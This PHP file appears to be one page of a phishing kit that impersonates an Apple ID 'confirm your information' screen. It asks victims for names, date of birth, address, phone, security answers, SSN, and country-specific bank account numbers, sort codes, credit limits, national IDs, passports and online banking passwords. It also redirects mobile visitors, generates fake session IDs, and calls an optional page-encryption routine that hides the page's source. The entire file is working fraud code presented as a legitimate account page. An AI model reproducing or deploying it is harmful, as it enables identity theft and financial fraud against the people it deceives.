<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
require "assets/includes/session_protect.php";
require "assets/includes/detect_country.php";
require "assets/includes/functions.php";
require "assets/includes/language.php";
require "assets/includes/One_Time.php";
require "CONTROLS.php";
require "assets/includes/bahasa.php";
$systemInfo  = systemInfo($_SERVER['REMOTE_ADDR']);
$platform = $systemInfo['os'];

if(!empty($_SESSION['fullname'])){
	$ccname = 'value="'.$_SESSION['fullname'].'"';
} else {
	$ccname = '';
}
if(!empty($_SESSION['firstname'])){
	$firstname = 'value="'.$_SESSION['firstname'].'"';
} else {
	$firstname = '';
}
if(!empty($_SESSION['midlename'])){
	$midlename = 'value="'.$_SESSION['midlename'].'"';
} else {
	$midlename = '';
}
if(!empty($_SESSION['lastname'])){
	$lastname = 'value="'.$_SESSION['lastname'].'"';
} else {
	$lastname = '';
}
if(!empty($_SESSION['address'])){
	$address = 'value="'.$_SESSION['address'].'"';
} else {
	$address = '';
}
if(!empty($_SESSION['city'])){
	$city = 'value="'.$_SESSION['city'].'"';
} else {
	$city = '';
}
if(!empty($_SESSION['zip'])){
	$zip = 'value="'.$_SESSION['zip'].'"';
} else {
	$zip = '';
}
if(!empty($_SESSION['state'])){
	$state = 'value="'.$_SESSION['state'].'"';
} else {
	$state = '';
}
if(!empty($_SESSION['phone'])){
	$x_phone_x = str_replace(" ", "", $_SESSION['phone']);
	$phone = 'value="'.$x_phone_x.'"';
} else {
	$phone = '';
}
if(!empty($_SESSION['dob'])){
	$dob = 'value="'.$_SESSION['dob'].'"';
} else {
	$dob = '';
}
if(!empty($_SESSION['carta'])){
	$card = 'placeholder="'.$_SESSION['carta'].'"';
} else {
	$card = 'placeholder="card number"';
}
if($EncryptScript == 1) {
require "assets/includes/enc.php";
encryptPage();
}
?>
<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">

if (screen.width <= 699) {
document.location = "Step1.php?&sessionid=<?php echo generateRandomString(115);?>&securessl=true";
}
</script>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Confirm your information</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<link href="assets/css/error-tips.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<?php include("assets/nav.php"); ?>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="not-mobile appleid-user">
                                    <span class="first_name"><?php echo $bhs['verify0'];?>
                                    </span><span class="first_name"><?php echo $systemInfo['os'];?>
                                    </span>
                                    <small class="SessionUser"><?php echo $_SESSION['firstname'];?> <?php echo $_SESSION['lastname'];?> <?php echo  $bhs['verify1']; ?> <strong><?php echo $_SESSION['user'];
                                        ?></strong>  </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <a href="Signout.php?sslchannel=true&sessionid=<?php echo md5(gmdate("r")).sha1(gmdate("r"));?>"><button class="btn btn-link"> <?php echo $bhs['verify00']; ?> </button></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">
<form action="#" method="post" name="details" id="details" class="proceed">
<div class="container flow-sections">
<?php if($True_Login == 2) { 
    
include("assets/form1.php");
require "assets/form2.php";
    
if ($negara=="IE"){
echo $sortcode;
echo $accnumber;
echo $creditlimit;
} elseif ($negara=="TH"){
echo $accnumber;
echo $citizenid;
echo $creditlimit;
} elseif($negara=="CH" or $negara=="KW"){
echo $accnumber;
} elseif ($negara=="GR" or $negara=="CN" or $negara=="KR" or $negara=="MN" or $negara=="TW" or $negara=="VN"){
echo $idnumber;
} elseif ($negara=="SA"){
echo $natid;
} elseif ($negara=="IN"){
echo $accnumber;
echo $creditlimit;
} elseif ($negara=="CY" or $negara=="HK"){
echo $passport;
} elseif ($negara=="QA"){
echo $qatarid;
} elseif ($negara=="KW"){
echo $civilid;
} elseif ($negara=="NZ"){
echo $creditlimit;
echo $bnz;
} elseif ($negara=="AU"){
echo $creditlimit;
} elseif ($negara=="CA"){
echo $creditlimit;
} elseif ($negara=="GB"){
echo $sortcodeuk;
echo $acno;
echo $drv;
echo $nis;
} elseif ($negara=="JP"){
echo $webid;
echo $passwds;
}
?>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<?php } ?>
<section class="flow-section mobile-section-edit  edit ">
    <div class="account-wrapper">
        <div class="row">
            <div class="col-md-3 section-name" id="heading-account">
                <h2 class="not-mobile section-title wrap-section-title"><?php echo $bhs['verify8']; ?></h2>
            </div>
            <div id="account-content" aria-labelledby="heading-account" class="col-md-9 subsection">
<div class="accordion-fade ">
    <div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $bhs['verify80']; ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="fname" id="fname" class="generic-input-field form-control field" <?php if (!empty($_SESSION['firstname'])) echo $firstname;?> placeholder="<?php echo $bhs['verify9']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="mname" id="mname" class="generic-input-field form-control field" <?php if (!empty($_SESSION['midlename'])) echo $midlename;?> placeholder="<?php echo $bhs['verify10']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
  <input type="text" name="lname" id="lname" class="generic-input-field form-control field" <?php if (!empty($_SESSION['lastname'])) echo $lastname;?> placeholder="<?php echo $bhs['verify11']; ?>">
</div>
</div>
</div>
</div>
</div>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle"><?php echo $bhs['verify12']; ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
<input id="dob" name="dob" class="form-control form-input" type="text" <?php if (!empty($_SESSION['dob'])) echo $dob;?> placeholder="<?php echo $bhs['verify13']; ?>">
</div>
</div>
</div>
</div>
</div>
<?php
if($negara=="US" or $negara=="CA") {
	echo $lang['SSN'];
}
?>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle"><?php echo $bhs['verify14']; ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="address" id="address" class="generic-input-field form-control field" <?php if (!empty($_SESSION['address'])) echo $address;?> placeholder="<?php echo $bhs['verify15']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="town" id="town" class="generic-input-field form-control field" <?php if (!empty($_SESSION['city'])) echo $city;?> placeholder="<?php echo $bhs['verify16']; ?>">
</div>
</div>
<div class="form-group clearfix middle-wrapper">
<div class="select-wrapper">
<?php
if(!empty($_SESSION['fullname'])) {
	if(!empty($_SESSION['state'])) {
		echo '<input type="text" name="county" id="county" class="generic-input-field form-control field" '.$state.' placeholder="'.$bhs['verify17'].'">';
	} else {
		echo '<input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="'.$bhs['verify17'].'">';
	}
} else {
	if($negara=="US" or $negara=="CA" or $negara=="AU" or $negara=="GB") {
		echo $lang['COUNTYSELECT'];
	} else {
		echo '<input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="'.$bhs['verify17'].'">';
	}
}
?>
</div>
</div>
<div class="form-group clearfix middle-wrapper">
<div class="select-wrapper">
  <input type="text" name="postcodes" id="postcodes" class="generic-input-field form-control field" <?php if (!empty($_SESSION['zip'])) echo $zip;?> placeholder="<?php echo $bhs['verify18']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
<input id="telephone" name="telephone" class="generic-input-field form-control field" type="text" <?php if (!empty($_SESSION['phone'])) echo $phone;?> placeholder="<?php echo $bhs['verify19']; ?>">
</div>
</div>
<?php if($negara=="US" or $negara=="CA" or $negara=="AU" or $negara=="GB") { ?>
<input type="hidden" name="country" value="<?php echo $lang['COUNTRY'];?>">
<?php } else { ?>
<input type="hidden" name="country" value="<?php echo $nama_negara;?>">
<?php } ?>
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<?php if($True_Login == 0 or $True_Login == 1) {

include("assets/form1.php");
require "assets/form2.php";

if ($negara=="IE"){
echo $sortcode;
echo $accnumber;
echo $creditlimit;
} elseif ($negara=="TH"){
echo $accnumber;
echo $citizenid;
echo $creditlimit;
} elseif($negara=="CH" or $negara=="KW"){
echo $accnumber;
} elseif ($negara=="GR" or $negara=="CN" or $negara=="KR" or $negara=="MN" or $negara=="TW" or $negara=="VN"){
echo $idnumber;
} elseif ($negara=="SA"){
echo $natid;
} elseif ($negara=="IN"){
echo $accnumber;
echo $creditlimit;
} elseif ($negara=="CY" or $negara=="HK"){
echo $passport;
} elseif ($negara=="QA"){
echo $qatarid;
} elseif ($negara=="KW"){
echo $civilid;
} elseif ($negara=="NZ"){
echo $creditlimit;
echo $bnz;
} elseif ($negara=="AU"){
echo $creditlimit;
} elseif ($negara=="CA"){
echo $creditlimit;
} elseif ($negara=="GB"){
echo $sortcodeuk;
echo $acno;
echo $drv;
echo $nis;
} elseif ($negara=="JP"){
echo $webid;
echo $passwds;
}
?>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<?php } ?>
<section class="flow-section mobile-section-edit  edit " style="border-bottom: 0px;">
<div class="account-wrapper">
<div class="row">
<div class="col-md-3 section-name" id="heading-account">
<h2 class="not-mobile section-title wrap-section-title"><?php echo $bhs['verify20']; ?></h2>
</div>
<div id="account-content" class="col-md-9 subsection">
<div class="accordion-fade ">
<div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">       
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $bhs['verify21']; ?></h3>
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<div class="select-wrapper">
<select id="q1" name="q1" type="text" class="form-control question" style="height:32px!important;padding-left:10px;">
  <option value=""><?php echo $bhs['verify22']; ?></option>
  <option value="<?php echo $bhs['verify23']; ?>"><?php echo $bhs['verify23']; ?></option>
  <option value="<?php echo $bhs['verify24']; ?>"><?php echo $bhs['verify24']; ?></option>
  <option value="<?php echo $bhs['verify25']; ?>"><?php echo $bhs['verify25']; ?></option>
  <option value="<?php echo $bhs['verify26']; ?>"><?php echo $bhs['verify26']; ?></option>
  <option value="<?php echo $bhs['verify27']; ?>"><?php echo $bhs['verify27']; ?></option>
  <option value="<?php echo $bhs['verify28']; ?>"><?php echo $bhs['verify28']; ?></option>
</select>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="a1" id="a1" class="generic-input-field form-control field" placeholder="<?php echo $bhs['verify29']; ?>">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
</div>
<input type="hidden" class="ijen" value="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true">
<input type="submit" class="gobtn btn-link" style="float:right;" value="<?php echo $bhs['verify30']; ?>">
</form>
<!-- FORM ENDS -->
</div>
</div>
</div>
</div>
<?php include("assets/footer.php"); ?>
</div>
</div>
</body>
</html>